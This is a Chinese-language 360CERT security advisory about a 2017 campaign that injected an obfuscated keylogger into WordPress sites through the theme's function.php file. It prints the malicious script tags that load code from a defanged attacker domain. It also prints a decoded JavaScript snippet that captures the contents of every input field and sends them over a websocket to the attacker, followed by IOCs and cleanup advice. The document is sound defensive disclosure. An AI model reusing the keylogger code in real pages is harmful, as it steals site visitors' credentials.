# 360CERT：Wordpress Keylogger事件报告

阅读量 **147551**

|评论 **1**

发布时间 : 2017-12-08 18:54:20

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t019cef207e37c75fd4.png)

## 0x00 事件背景

Catalin
Cimpanu发现几起针对WordPress站点的攻击，主要通过加载恶意脚本进行键盘记录，挖矿或者挂载广告。并且有证据表明，这种攻击从4月份活跃至今。360CERT对该事件十分关注。

## 0x01 事件描述

起因是WordPress被注入了一个混淆的js脚本，从主题的function.php文件进行植入。加载的js脚本地址为：

    
    
    <script type='text/javascript' src='hxxp://cloudflare[.]solutions/ajax/libs/reconnecting-websocket/1.0.0/reconnecting-websocket.js'></script>  
    <script type='text/javascript' src='hxxp://cloudflare[.]solutions/ajax/libs/cors/cors.js'></script>
    

其中reconnecting-websocket.js用作websocket通信，cors.js中包含后门。Cors.js更改前端页面，释放javascript脚本进行输入监听，之后将数据发送给攻击者（wss://cloudflare[.]solutions:8085/）。

![](https://cert.360.cn/static/fileimg/picture_1_1512729045.png)

![](https://cert.360.cn/static/fileimg/picture_2_1512729056.png)

## 0x02攻击脚本分析

![](https://cert.360.cn/static/fileimg/picture_3_1512729066.png)

用户WordPress首页底部有两个JS，第一个用来做websocket通信。后门核心文件http://cloudflare[.]solutions/ajax/libs/cors/cors.js。其中cors.js有混淆，简单处理后得到攻击脚本：

![](https://cert.360.cn/static/fileimg/picture_4_1512729073.png)

攻击脚本会首先调用linter()，其中有对linterkey1，linterkey2的解码。

    
    
    https://cdnjs.cloudflare.com/ajax/libs/linter/linter.js?657[.............................]
    

中，域名cdnjs.cloudflare.com是不存在的，根据代码逻辑，有用的部分应为？后的内容：

![](https://cert.360.cn/static/fileimg/picture_5_1512729109.png)

解密出：

![](https://cert.360.cn/static/fileimg/picture_6_1512729094.png)

    
    
    function process_event(event) {  
    var result = JSON.stringify({key:event.target.value , element: event.target.id});  
    socket.send(result);  
    }  
    var i_fields = document.getElementsByTagName('input');  
    for(var i=0; i < i_fields.length; i++) {  
    i_fields[i].addEventListener('blur',process_event);  
    }
    

逻辑很好理解，监听blur 事件(输入框失去焦点) 通过websocket发送用户input内容。

![](https://cert.360.cn/static/fileimg/picture_7_1512729121.png)

最后，窗口加载后执行addyandexmetrix()。该函数是一个类似cnzz，做访问统计的js，具体用法：

<https://yandex.com/support/metrica/code/counter-initialize.xml>

## 0x03 攻击影响

查看cloudflare[.]solutions DNS请求记录：

![](https://cert.360.cn/static/fileimg/picture_8_1512729145.png)

可以看到，在6月份有一个峰值。并且在近期，攻击趋势陡然上升。以下是今天，截至写稿时的请求记录：

![](https://cert.360.cn/static/fileimg/picture_9_1512729156.png)

可以看到，今天时，该攻击已经激化。

对页面进行检索，发现全球有近五千多站点被感染：

![](https://cert.360.cn/static/fileimg/picture_10_1512729164.png)

以下受感染的部分域名：

![](https://cert.360.cn/static/fileimg/picture_11_1512729174.png)

## 0x04 缓解措施

查看页面源代码中是否有向cloudflare[.]solutions的JS请求，通过这种方法进行自检。

![](https://cert.360.cn/static/fileimg/picture_12_1512729183.png)

恶意的JS是通过WordPress主题的function.php文件进行植入。请立即删除文件中，页面渲染恶意JS的部分。此时，密码很有可能已经被偷取，请及时更改密码。

## 0x05 IOCs

资源请求：

hxxp://cloudflare[.]solutions/ajax/libs/reconnecting-websocket/1.0.0/reconnecting-websocket.js

hxxp://cloudflare[.]solutions/ajax/libs/cors/cors.js

数据接收：

wss://cloudflare[.]solutions:8085/

## 0x06 时间线

2017年12月7日 Catalin Cimpanu事件披露

2017年12月8日 360CERT及时跟进，发布预警

## 0x07 参考

<https://www.bleepingcomputer.com/news/security/keylogger-found-on-nearly-5-500-infected-wordpress-sites/>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **360CERT安全通告** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/89941](/post/id/89941)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [WordPress](/tag/WordPress)

 **+1** __0赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t013be54b59d8ac5fe6.jpg)
360CERT安全通告

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

